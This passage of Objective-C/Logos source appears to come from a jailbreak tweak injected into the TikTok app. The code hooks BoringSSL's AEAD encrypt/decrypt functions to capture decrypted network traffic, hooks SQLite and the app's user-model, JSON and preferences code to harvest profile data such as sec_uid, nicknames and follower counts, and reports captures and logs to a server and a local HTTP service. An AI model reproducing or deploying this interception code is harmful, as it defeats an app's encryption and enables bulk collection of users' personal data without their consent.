            if (bufHasTikTokSignature(out, *out_len)) { g_open_sig++; handleAEADPlain(out, *out_len, NO); }
        }
    } @catch (__unused NSException *e) {}
    return ret;
}

static int my_aead_seal(const void *ctx, uint8_t *out, size_t *out_len, size_t max_out_len,
                        const uint8_t *nonce, size_t nonce_len,
                        const uint8_t *in, size_t in_len,
                        const uint8_t *ad, size_t ad_len) {
    @try {
        if (in && in_len >= 16) {
            g_seal_calls++;
            if ((long)in_len > g_seal_max) g_seal_max = (long)in_len;
            if (bufHasTikTokSignature(in, in_len)) { g_seal_sig++; handleAEADPlain(in, in_len, YES); }
        }
    } @catch (__unused NSException *e) {}
    return orig_aead_seal(ctx, out, out_len, max_out_len, nonce, nonce_len, in, in_len, ad, ad_len);
}

typedef void (*MSHookFunction_t)(void *symbol, void *replace, void **result);

static void installAEADHooks() {
    // 关键: 用 inline hook 挂函数本体, 覆盖所有调用者(含 MusicallyCore 在 __DATA_CONST GOT 里的 QUIC 链路)
    // fishhook 只改 __DATA 的 GOT, 抓不到 __DATA_CONST 的 QUIC —— 这是之前 profile/self 漏抓的真因
    void *p_open = dlsym(RTLD_DEFAULT, "EVP_AEAD_CTX_open");
    void *p_seal = dlsym(RTLD_DEFAULT, "EVP_AEAD_CTX_seal");
    // 运行时找 MSHookFunction(ElleKit/Substitute/CydiaSubstrate 任一注入环境都导出它), 零编译依赖
    MSHookFunction_t mshook = (MSHookFunction_t)dlsym(RTLD_DEFAULT, "MSHookFunction");
    NSLog(@"[TKCap] dlsym open=%p seal=%p MSHook=%p", p_open, p_seal, (void*)mshook);

    BOOL usedInline = NO;
    if (mshook && p_open && p_seal) {
        mshook(p_open, (void *)my_aead_open, (void **)&orig_aead_open);
        mshook(p_seal, (void *)my_aead_seal, (void **)&orig_aead_seal);
        usedInline = (orig_aead_open != NULL && orig_aead_seal != NULL);
    }

    // 兜底: 若 inline hook 不可用, 退回 fishhook(至少还能抓走 __DATA GOT 的直播/TLS 流量)
    if (!usedInline) {
        struct rebinding rebs[2];
        rebs[0].name = "EVP_AEAD_CTX_open";
        rebs[0].replacement = (void *)my_aead_open;
        rebs[0].replaced = (void **)&orig_aead_open;
        rebs[1].name = "EVP_AEAD_CTX_seal";
        rebs[1].replacement = (void *)my_aead_seal;
        rebs[1].replaced = (void **)&orig_aead_seal;
        rebind_symbols(rebs, 2);
    }
    NSString *s = [NSString stringWithFormat:@"[TKCap] AEAD hook 方式=%@ open=%p seal=%p",
                   usedInline?@"INLINE(MSHook)":@"fishhook兜底", (void*)orig_aead_open, (void*)orig_aead_seal];
    NSLog(@"%@", s);
    sendLogToServer(@"info", s);
}

// ============================================
// SQLite Hook - 拦截数据库查询（抓解密后的明文）
// ============================================

typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;

static int (*orig_sqlite3_step)(sqlite3_stmt*) = NULL;
static const unsigned char* (*orig_sqlite3_column_text)(sqlite3_stmt*, int) = NULL;
static const char* (*orig_sqlite3_column_name)(sqlite3_stmt*, int) = NULL;
static int (*orig_sqlite3_column_count)(sqlite3_stmt*) = NULL;

static int my_sqlite3_step(sqlite3_stmt *stmt) {
    int ret = orig_sqlite3_step(stmt);

    if (ret == 100) { // SQLITE_ROW - 成功返回一行数据
        @try {
            int colCount = orig_sqlite3_column_count ? orig_sqlite3_column_count(stmt) : 0;
            if (colCount <= 0 || colCount > 200) return ret; // 防御性检查

            NSMutableDictionary *row = [NSMutableDictionary dictionary];
            NSMutableString *rawLine = [NSMutableString string];

            // 读取这一行的所有列
            for (int i = 0; i < colCount; i++) {
                const char *colName = orig_sqlite3_column_name ? orig_sqlite3_column_name(stmt, i) : NULL;
                const unsigned char *colValue = orig_sqlite3_column_text ? orig_sqlite3_column_text(stmt, i) : NULL;

                if (colName && colValue) {
                    NSString *name = @(colName);
                    NSString *value = @((const char*)colValue);
                    row[name] = value;
                    [rawLine appendFormat:@"%@=%@ | ", name, value.length > 50 ? [value substringToIndex:50] : value];
                }
            }

            // 检查是否包含用户数据特征字段
            if (row[@"sec_uid"] || row[@"follower_count"] || row[@"unique_id"] ||
                row[@"aweme_count"] || row[@"following_count"] || row[@"nickname"] ||
                [rawLine rangeOfString:@"sec_uid" options:NSCaseInsensitiveSearch].location != NSNotFound ||
                [rawLine rangeOfString:@"follower" options:NSCaseInsensitiveSearch].location != NSNotFound) {

                HLog(@"[SQLite★] 用户数据行: %@", rawLine.length > 1000 ? [rawLine substringToIndex:1000] : rawLine);
                recordCapture(@"[SQLite★]", @"DB", [row description], nil, nil);
            }
        } @catch (__unused NSException *e) {}
    }

    return ret;
}

static void installSQLiteHooks() {
    struct rebinding rebs[4];

    rebs[0].name = "sqlite3_step";
    rebs[0].replacement = (void*)my_sqlite3_step;
    rebs[0].replaced = (void**)&orig_sqlite3_step;

    rebs[1].name = "sqlite3_column_text";
    rebs[1].replacement = NULL;
    rebs[1].replaced = (void**)&orig_sqlite3_column_text;

    rebs[2].name = "sqlite3_column_name";
    rebs[2].replacement = NULL;
    rebs[2].replaced = (void**)&orig_sqlite3_column_name;

    rebs[3].name = "sqlite3_column_count";
    rebs[3].replacement = NULL;
    rebs[3].replaced = (void**)&orig_sqlite3_column_count;

    rebind_symbols(rebs, 4);
    HLog(@"✅ SQLite hooks 已安装");
}

// ============================================
// Model 层 Hook - 抓内存缓存的 profile 数据
// ============================================

%hook TTKUser
- (id)initWithDictionary:(id)dict {
    id ret = %orig;
    @try {
        if (ret) {
            NSString *desc = [ret description];
            if (desc && ([desc containsString:@"sec_uid"] || [desc containsString:@"follower"])) {
                HLog(@"[TTKUser初始化★] %@", desc.length > 1000 ? [desc substringToIndex:1000] : desc);
                recordCapture(@"[TTKUser对象★]", @"MODEL", desc, nil, nil);
            }
        }
    } @catch (__unused NSException *e) {}
    return ret;
}

- (NSString *)secUid {
    NSString *ret = %orig;
    if (ret && ret.length > 0) HLog(@"[TTKUser] secUid访问: %@", ret);
    return ret;
}

- (NSNumber *)followerCount {
    NSNumber *ret = %orig;
    if (ret) HLog(@"[TTKUser] followerCount访问: %@", ret);
    return ret;
}
%end

%hook AWEUserModel
- (id)initWithDictionary:(id)dict {
    id ret = %orig;
    @try {
        if (ret) {
            NSString *desc = [ret description];
            if (desc && ([desc containsString:@"sec_uid"] || [desc containsString:@"follower"])) {
                HLog(@"[AWEUserModel初始化★] %@", desc.length > 1000 ? [desc substringToIndex:1000] : desc);
                recordCapture(@"[AWEUserModel对象★]", @"MODEL", desc, nil, nil);
            }
        }
    } @catch (__unused NSException *e) {}
    return ret;
}
%end

// Hook JSON 反序列化 - 捕获所有 JSON 解析出的用户数据
%hook NSJSONSerialization
+ (id)JSONObjectWithData:(NSData *)data options:(NSJSONReadingOptions)opt error:(NSError **)error {
    id ret = %orig;
    @try {
        if (ret && [ret isKindOfClass:[NSDictionary class]]) {
            NSDictionary *dict = (NSDictionary *)ret;
            // 检查是否包含用户资料字段
            if (dict[@"sec_uid"] || dict[@"follower_count"] || dict[@"unique_id"] || dict[@"aweme_count"]) {
                NSString *json = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
                if (json && json.length > 0) {
                    HLog(@"[JSON解析★] 用户数据 len=%lu", (unsigned long)json.length);
                    recordCapture(@"[JSON解析★]", @"JSON",
                                json.length > 2000 ? [json substringToIndex:2000] : json,
                                nil, nil);
                }
            }
        }
    } @catch (__unused NSException *e) {}
    return ret;
}
%end

// Hook NSUserDefaults - 检查是否缓存在偏好设置
%hook NSUserDefaults
- (id)objectForKey:(NSString *)key {
    id ret = %orig;
    @try {
        if (ret && key) {
            NSString *lowerKey = [key lowercaseString];
            if ([lowerKey containsString:@"user"] || [lowerKey containsString:@"profile"] ||
                [lowerKey containsString:@"account"] || [lowerKey containsString:@"self"]) {
                NSString *desc = [ret description];
                if (desc && [desc containsString:@"sec_uid"]) {
                    HLog(@"[NSUserDefaults★] key=%@ 包含用户数据", key);
                    recordCapture([NSString stringWithFormat:@"[NSUserDefaults★] %@", key],
                                @"CACHE", desc.length > 1000 ? [desc substringToIndex:1000] : desc, nil, nil);
                }
            }
        }
    } @catch (__unused NSException *e) {}
    return ret;
}
%end

// ============ 初始化 ============
%ctor {
    capturedRequests = [NSMutableArray array];
    installAEADHooks();   // 尽早挂, 抓全流量
    installSQLiteHooks(); // 拦截 WCDB 解密后的明文数据

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
        createFloatingButton();
        startHTTPServer();
        HLog(@"✅ 抓包插件已加载(含Model层), 端口%d", HTTP_PORT);
    });
    // 诊断: 每8秒上报一次AEAD计数, 判定业务流量到底走没走boringssl的AEAD
    static dispatch_source_t t = nil;
    t = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, dispatch_get_global_queue(0,0));
    dispatch_source_set_timer(t, dispatch_time(DISPATCH_TIME_NOW, 8*NSEC_PER_SEC), 8*NSEC_PER_SEC, NSEC_PER_SEC);
    dispatch_source_set_event_handler(t, ^{
        NSString *s = [NSString stringWithFormat:@"[AEAD-STAT] open=%ld(sig=%ld,max=%ld) seal=%ld(sig=%ld,max=%ld)",
                       g_open_calls, g_open_sig, g_open_max, g_seal_calls, g_seal_sig, g_seal_max];
        sendLogToServer(@"info", s);
    });
    dispatch_resume(t);
}
